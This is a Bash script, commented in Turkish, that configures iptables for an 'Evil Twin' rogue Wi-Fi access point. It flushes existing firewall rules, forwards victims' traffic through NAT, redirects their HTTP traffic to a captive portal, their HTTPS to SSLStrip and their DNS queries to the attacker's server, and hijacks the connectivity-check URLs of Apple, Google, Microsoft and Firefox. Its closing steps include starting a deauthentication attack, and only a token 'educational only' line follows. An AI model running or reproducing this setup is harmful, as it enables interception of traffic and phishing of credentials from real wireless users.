#!/bin/bash

# Evil Twin Saldırısı - IPTables Kuralları
# Bu script ağ trafiğini yönlendirmek için gerekli firewall kurallarını ayarlar

echo "🔥 Evil Twin - IPTables Kuralları Ayarlanıyor..."
echo "================================================"

# Root kontrolü
if [ "$EUID" -ne 0 ]; then
    echo "❌ Bu script root yetkisiyle çalıştırılmalıdır!"
    echo "Kullanım: sudo ./iptables_rules.sh"
    exit 1
fi

# Değişkenler
WLAN_INTERFACE="wlan0"          # Evil Twin arayüzü
INTERNET_INTERFACE="eth0"       # İnternet bağlantısı arayüzü
EVIL_TWIN_IP="192.168.1.1"     # Evil Twin gateway IP
EVIL_TWIN_SUBNET="192.168.1.0/24"  # Evil Twin subnet
WEB_PORT="80"                   # HTTP portu
HTTPS_PORT="443"                # HTTPS portu
SSLSTRIP_PORT="8080"            # SSLStrip portu
DNS_PORT="53"                   # DNS portu

echo "📋 Yapılandırma:"
echo "   Evil Twin Arayüzü: $WLAN_INTERFACE"
echo "   İnternet Arayüzü: $INTERNET_INTERFACE"
echo "   Gateway IP: $EVIL_TWIN_IP"
echo "   Subnet: $EVIL_TWIN_SUBNET"
echo ""

# ============================================================================
# MEVCUT KURALLARI TEMİZLE
# ============================================================================

echo "🧹 Mevcut iptables kuralları temizleniyor..."

# Tüm kuralları temizle
iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -t raw -F
iptables -t raw -X

# Varsayılan politikaları ayarla
iptables -P INPUT ACCEPT
iptables -P FORWARD ACCEPT
iptables -P OUTPUT ACCEPT

echo "✅ Eski kurallar temizlendi"

# ============================================================================
# IP FORWARDING AKTİFLEŞTİR
# ============================================================================

echo "🔄 IP forwarding aktifleştiriliyor..."

# Geçici olarak aktifleştir
echo 1 > /proc/sys/net/ipv4/ip_forward

# Kalıcı olarak aktifleştir
if ! grep -q "net.ipv4.ip_forward=1" /etc/sysctl.conf; then
    echo "net.ipv4.ip_forward=1" >> /etc/sysctl.conf
fi

sysctl -p > /dev/null 2>&1

echo "✅ IP forwarding aktif"

# ============================================================================
# NAT KURALLARI (İnternet Bağlantısı)
# ============================================================================

echo "🌐 NAT kuralları ayarlanıyor..."

# Masquerading - Evil Twin'den internete çıkış
iptables -t nat -A POSTROUTING -o $INTERNET_INTERFACE -j MASQUERADE

# Evil Twin subnet'inden gelen trafiği internet arayüzüne yönlendir
iptables -t nat -A POSTROUTING -s $EVIL_TWIN_SUBNET -o $INTERNET_INTERFACE -j MASQUERADE

# Gelen bağlantıları kabul et
iptables -A FORWARD -i $INTERNET_INTERFACE -o $WLAN_INTERFACE -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i $WLAN_INTERFACE -o $INTERNET_INTERFACE -j ACCEPT

echo "✅ NAT kuralları ayarlandı"

# ============================================================================
# HTTP/HTTPS TRAFİK YÖNLENDİRME
# ============================================================================

echo "🔀 HTTP/HTTPS trafik yönlendirme ayarlanıyor..."

# HTTP trafiğini captive portal'a yönlendir
iptables -t nat -A PREROUTING -i $WLAN_INTERFACE -p tcp --dport $WEB_PORT -j DNAT --to-destination $EVIL_TWIN_IP:$WEB_PORT

# HTTPS trafiğini SSLStrip'e yönlendir (isteğe bağlı)
iptables -t nat -A PREROUTING -i $WLAN_INTERFACE -p tcp --dport $HTTPS_PORT -j DNAT --to-destination $EVIL_TWIN_IP:$SSLSTRIP_PORT

# Captive portal trafiğini kabul et
iptables -A INPUT -i $WLAN_INTERFACE -p tcp --dport $WEB_PORT -j ACCEPT
iptables -A INPUT -i $WLAN_INTERFACE -p tcp --dport $SSLSTRIP_PORT -j ACCEPT

echo "✅ HTTP/HTTPS yönlendirme ayarlandı"

# ============================================================================
# DNS TRAFİK YÖNLENDİRME
# ============================================================================

echo "🔍 DNS trafik yönlendirme ayarlanıyor..."

# Tüm DNS sorgularını kendi DNS sunucumuza yönlendir
iptables -t nat -A PREROUTING -i $WLAN_INTERFACE -p udp --dport $DNS_PORT -j DNAT --to-destination $EVIL_TWIN_IP:$DNS_PORT
iptables -t nat -A PREROUTING -i $WLAN_INTERFACE -p tcp --dport $DNS_PORT -j DNAT --to-destination $EVIL_TWIN_IP:$DNS_PORT

# DNS trafiğini kabul et
iptables -A INPUT -i $WLAN_INTERFACE -p udp --dport $DNS_PORT -j ACCEPT
iptables -A INPUT -i $WLAN_INTERFACE -p tcp --dport $DNS_PORT -j ACCEPT

echo "✅ DNS yönlendirme ayarlandı"

# ============================================================================
# DHCP TRAFİK KURALLARI
# ============================================================================

echo "📡 DHCP trafik kuralları ayarlanıyor..."

# DHCP sunucu trafiğini kabul et
iptables -A INPUT -i $WLAN_INTERFACE -p udp --dport 67 -j ACCEPT
iptables -A INPUT -i $WLAN_INTERFACE -p udp --dport 68 -j ACCEPT
iptables -A OUTPUT -o $WLAN_INTERFACE -p udp --sport 67 -j ACCEPT
iptables -A OUTPUT -o $WLAN_INTERFACE -p udp --sport 68 -j ACCEPT

echo "✅ DHCP kuralları ayarlandı"

# ============================================================================
# CAPTIVE PORTAL KURALLARI
# ============================================================================

echo "🚪 Captive Portal kuralları ayarlanıyor..."

# Captive portal test URL'lerini yakalama
# Apple
iptables -t nat -A PREROUTING -i $WLAN_INTERFACE -p tcp -d captive.apple.com --dport 80 -j DNAT --to-destination $EVIL_TWIN_IP:80

# Google
iptables -t nat -A PREROUTING -i $WLAN_INTERFACE -p tcp -d connectivitycheck.gstatic.com --dport 80 -j DNAT --to-destination $EVIL_TWIN_IP:80

# Microsoft
iptables -t nat -A PREROUTING -i $WLAN_INTERFACE -p tcp -d msftconnecttest.com --dport 80 -j DNAT --to-destination $EVIL_TWIN_IP:80

# Firefox
iptables -t nat -A PREROUTING -i $WLAN_INTERFACE -p tcp -d detectportal.firefox.com --dport 80 -j DNAT --to-destination $EVIL_TWIN_IP:80

echo "✅ Captive Portal kuralları ayarlandı"

# ============================================================================
# GÜVENLİK KURALLARI
# ============================================================================

echo "🛡️ Güvenlik kuralları ayarlanıyor..."

# Loopback trafiğini kabul et
iptables -A INPUT -i lo -j ACCEPT
iptables -A OUTPUT -o lo -j ACCEPT

# Established ve related bağlantıları kabul et
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# SSH erişimini koru (isteğe bağlı)
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# ICMP (ping) trafiğini kabul et
iptables -A INPUT -p icmp -j ACCEPT

# Evil Twin arayüzünden gelen trafiği kabul et
iptables -A INPUT -i $WLAN_INTERFACE -j ACCEPT

echo "✅ Güvenlik kuralları ayarlandı"

# ============================================================================
# SSLSTRIP KURALLARI (İsteğe bağlı)
# ============================================================================

echo "🔐 SSLStrip kuralları ayarlanıyor..."

# HTTPS trafiğini SSLStrip'e yönlendir
iptables -t nat -A PREROUTING -i $WLAN_INTERFACE -p tcp --dport 443 -j REDIRECT --to-port $SSLSTRIP_PORT

# SSLStrip portunu kabul et
iptables -A INPUT -i $WLAN_INTERFACE -p tcp --dport $SSLSTRIP_PORT -j ACCEPT

echo "✅ SSLStrip kuralları ayarlandı"

# ============================================================================
# LOG KURALLARI (Debug için)
# ============================================================================

echo "📝 Log kuralları ayarlanıyor..."

# HTTP isteklerini logla
iptables -A PREROUTING -t nat -i $WLAN_INTERFACE -p tcp --dport 80 -j LOG --log-prefix "[EVIL-TWIN-HTTP] "

# HTTPS isteklerini logla
iptables -A PREROUTING -t nat -i $WLAN_INTERFACE -p tcp --dport 443 -j LOG --log-prefix "[EVIL-TWIN-HTTPS] "

# DNS isteklerini logla
iptables -A PREROUTING -t nat -i $WLAN_INTERFACE -p udp --dport 53 -j LOG --log-prefix "[EVIL-TWIN-DNS] "

echo "✅ Log kuralları ayarlandı"

# ============================================================================
# KURAL LİSTESİNİ GÖSTER
# ============================================================================

echo ""
echo "📋 Aktif IPTables Kuralları:"
echo "============================="
echo ""
echo "🔥 NAT Tablosu:"
iptables -t nat -L -n --line-numbers
echo ""
echo "🔥 Filter Tablosu:"
iptables -L -n --line-numbers

# ============================================================================
# KURALLARI KAYDET
# ============================================================================

echo ""
echo "💾 Kurallar kaydediliyor..."

# Debian/Ubuntu için
if command -v iptables-save > /dev/null; then
    iptables-save > /etc/iptables/rules.v4 2>/dev/null || iptables-save > /tmp/evil-twin-iptables.rules
    echo "✅ IPTables kuralları kaydedildi"
fi

# ============================================================================
# DURUM KONTROLÜ
# ============================================================================

echo ""
echo "🔍 Durum Kontrolü:"
echo "=================="

# IP forwarding kontrolü
if [ "$(cat /proc/sys/net/ipv4/ip_forward)" = "1" ]; then
    echo "✅ IP forwarding aktif"
else
    echo "❌ IP forwarding pasif"
fi

# Arayüz kontrolü
if ip addr show $WLAN_INTERFACE > /dev/null 2>&1; then
    echo "✅ $WLAN_INTERFACE arayüzü mevcut"
else
    echo "❌ $WLAN_INTERFACE arayüzü bulunamadı"
fi

if ip addr show $INTERNET_INTERFACE > /dev/null 2>&1; then
    echo "✅ $INTERNET_INTERFACE arayüzü mevcut"
else
    echo "⚠️ $INTERNET_INTERFACE arayüzü bulunamadı (internet bağlantısı olmayabilir)"
fi

# ============================================================================
# TAMAMLANDI
# ============================================================================

echo ""
echo "🎉 IPTables Kuralları Başarıyla Ayarlandı!"
echo "==========================================="
echo ""
echo "📋 Sonraki Adımlar:"
echo "1. Hostapd'yi başlatın: sudo hostapd /path/to/hostapd.conf"
echo "2. Dnsmasq'ı başlatın: sudo dnsmasq -C /path/to/dnsmasq.conf"
echo "3. Web sunucusunu başlatın"
echo "4. SSLStrip'i başlatın (isteğe bağlı)"
echo "5. Deauthentication saldırısını başlatın"
echo ""
echo "🔧 Kuralları temizlemek için:"
echo "sudo iptables -F && sudo iptables -t nat -F"
echo ""
echo "📝 Log dosyaları: /var/log/kern.log veya dmesg"
echo ""
echo "⚠️ Bu kurallar yalnızca eğitim amaçlıdır!"

# Log dosyası oluştur
echo "$(date): IPTables kuralları ayarlandı" >> /var/log/evil-twin/iptables.log 2>/dev/null || true